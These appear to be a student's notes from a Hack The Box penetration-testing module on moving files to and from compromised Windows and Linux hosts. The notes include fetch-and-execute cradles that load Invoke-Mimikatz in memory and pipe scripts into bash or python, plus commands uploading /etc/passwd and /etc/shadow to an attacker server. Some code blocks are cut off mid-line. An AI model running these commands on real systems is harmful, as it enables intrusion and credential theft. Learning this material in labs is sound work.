---
name: ls-filetransfer
description: 'Skill: ls-filetransfer'
license: MIT
tags:
- general
---

## Closing Thoughts

As we've seen in this module, there are many ways to transfer files to and from our attack host between Windows and Linux systems. It's worth practicing as many of these as possible throughout the modules in the Penetration Tester path. Got a web shell on a target? Try downloading a file to the target for additional enumeration using Certutil. Need to download a file off the target? Try an Impacket SMB server or a Python web server with upload capabilities. Refer back to this module periodically and strive to use all the methods taught in some fashion. Also, take some time whenever you're working on a target or lab to search for a LOLBin or GTFOBin that you've never worked with before to accomplish your file transfer goals.#filetransfer #hacking #windows #powershell 

#### [fileless threats](https://docs.microsoft.com/en-us/microsoft-365/security/intelligence/fileless-threats?view=o365-worldwide)

The term `fileless` suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.

#### [Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)

generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).
All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process. Below is a graphical depiction of the attack.

![image](https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png)

[](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

## file transfer Windows

**PowerShell Base64 Encode & Decode**

--> [[Lesson 02 - Windows File Transfer Methods]]

### Downloads

check hash:
```shell-session
md5sum filename.txt
```

encode to base64 (a cosa serve "echo"?):
```shell-session
cat filename.txt |base64 -w 0;echo
```

decode from base64 in Power Shell
```powershell-session
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ENCODED_STRING"))
```

Finally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.
```powershell-session
Get-FileHash C:\Users\Public\filename.txt -Algorithm md5
```

**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

#### PowerShell DownloadFile Method

We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.

File Download

```powershell-session
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```


#### PowerShell DownloadString - Fileless Method

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

PowerShell DownloadString - Fileless Method

```powershell-session
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`IEX` also accepts pipeline input.

PowerShell DownloadString - Fileless Method

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```


#### PowerShell Invoke-WebRequest

From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

PowerShell Invoke-WebRequest

```powershell-session
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.

#### SMB Downloads

The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

see here for instructions --> [[Lesson 02 - Windows File Transfer Methods#^ba0edb]]


#### FTP Downloads

Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

see here for instructions --> [[Lesson 02 - Windows File Transfer Methods#^cd00c2]]

##### Transfering Files from an FTP Server Using PowerShell

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Us
```

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
##### Create a Command File for the FTP Client and Download the Target File

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### Upload Operations

There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for uploads. Let's see how we can accomplish uploading files in various way.

Powershell Base64 Encode & Decode --> [[Lesson 02 - Windows File Transfer Methods#^32a07c]]
#### PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

see instructions --> [[Lesson 02 - Windows File Transfer Methods#^9c2993]]
##### SMB Uploads --> [[Lesson 02 - Windows File Transfer Methods#^84ecfb]]

We previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

## file transfer linux

--> [[Lesson 03 - Linux File Transfer Methods|see here for more]]

### download
#### Fileless Attacks Using Linux

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.

Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

**Fileless Download with cURL**
```shell-session
tr01ax@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

**Fileless Download with wget**
```shell-session
tr01ax@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```


#### Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

**Connect to the Target Webserver**
```shell-session
tr01ax@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP GET Request**
```shell-session
tr01ax@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**Print the Response**
```shell-session
tr01ax@htb[/htb]$ cat <&3
```

#### SSH Downloads

Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.

**Enabling the SSH Server**
```shell-session
tr01ax@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

**Starting the SSH Server**
```shell-session
tr01ax@htb[/htb]$ sudo systemctl start ssh
```

**Checking for SSH Listening Port**
```shell-session
tr01ax@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.

**Linux - Downloading Files Using SCP**
```shell-session
tr01ax@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

### uploads

#### Web Upload

As mentioned in the [[Lesson 02 - Windows File Transfer Methods|Windows File Transfer Methods section]], we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.

The first thing we need to do is to install the `uploadserver` module.

**Pwnbox - Start Web Server**
```shell-session
tr01ax@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Now we need to create a certificate. In this example, we are using a self-signed certificate.

**Pwnbox - Create a Self-Signed Certificate**
```shell-session
tr01ax@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

#### Pwnbox - Start Web Server

Pwnbox - Start Web Server

```shell-session
tr01ax@htb[/htb]$ mkdir https && cd https
```

Pwnbox - Start Web Server

```shell-session
tr01ax@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

**Linux - Upload Multiple Files**
```shell-session
tr01ax@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.

#### Linux - Creating a Web Server with Python or PHP

start a web server on target machine to download files to attacker machine

**Linux - Creating a Web Server with Python3**
```shell-session
tr01ax@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Linux - Creating a Web Server with Python2.7**
```shell-session
tr01ax@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Linux - Creating a Web Server with PHP**
```shell-session
tr01ax@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

**Linux - Creating a Web Server with Ruby**
```shell-session
tr01ax@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

## Transferring files with code

--> [[Lesson 04 - Transfering Files with Code|see here]]

### Python

Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. `Python` can run one-liners from an operating system command line using the option `-c`. Let's see some examples:

**Python 2 - Download**
```shell-session
tr01ax@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Python 3 - Download**
```shell-session
tr01ax@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### PHP

**PHP Download with File_get_contents()**
```shell-session
tr01ax@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.

**PHP Download with File_get_contents()**
```shell-session
tr01ax@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.

**PHP Download with Fopen()**
```shell-session
tr01ax@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $fl
```

**PHP Download a File and Pipe it to Bash**
```shell-session
tr01ax@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Other languages

--> [[Lesson 04 - Transfering Files with Code#^dd72a9|other languages]]
--> [[Lesson 04 - Transfering Files with Code#^e9a638|JavaScript]]
--> [[Lesson 04 - Transfering Files with Code#^31ae1b|VBScript]]

### Upload with Python
--> [[Lesson 04 - Transfering Files with Code#^f95651|see here for more]]

**Starting the Python uploadserver Module**
```shell-session
tr01ax@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Uploading a File Using a Python One-liner**
```shell-session
tr01ax@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```


### JavaScript

The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Download a File Using JavaScript and cscript.exe

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


### VBScript

The following VBScript example can be used based on [this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). We'll create a file called `wget.vbs` and save the following content:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Download a File Using VBScript and cscript.exe

```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### Upload Operations using Python3

[[Lesson 04 - Transfering Files with Code#^f95651|see here for more]]

If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 [requests module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).

**Starting the Python uploadserver Module**
```shell-session
tr01ax@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Uploading a File Using a Python One-liner**
```shell-session
tr01ax@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## Miscellaneous File Transfer Methods

[[Lesson 05 - Miscellaneous File Transfer Methods|see here for more]]

**Notable**

Mounting a Linux Folder Using xfreerdp
```shell-session
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Mounting a Linux Folder Using rdesktop
```shell-session
tr01ax@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

## Living of the Land

[[Lesson 08 - Living off The Land|see here for more]]

We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

Upload win.ini to our Pwnbox

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

This will send the file to our Netcat session, and we can copy-paste its contents.

File Received in our Netcat Session

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 80
```
